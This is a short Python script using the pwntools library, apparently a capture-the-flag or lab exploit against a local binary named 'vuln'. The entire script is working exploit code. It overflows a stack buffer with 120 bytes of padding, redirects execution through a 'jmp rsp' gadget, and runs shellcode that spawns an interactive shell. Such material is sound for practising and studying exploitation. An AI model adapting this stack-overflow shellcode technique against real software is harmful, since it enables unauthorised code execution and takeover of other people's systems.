from pwn import *


elf = context.binary = ELF("./vuln")


# 0x0000000000401161 : jmp rsp
jmp_rsp = 0x0000000000401161

payload = flat([
    b"A" * 120,
    jmp_rsp,
    asm(shellcraft.sh())
])

p = process()
p.sendline(payload)
p.interactive()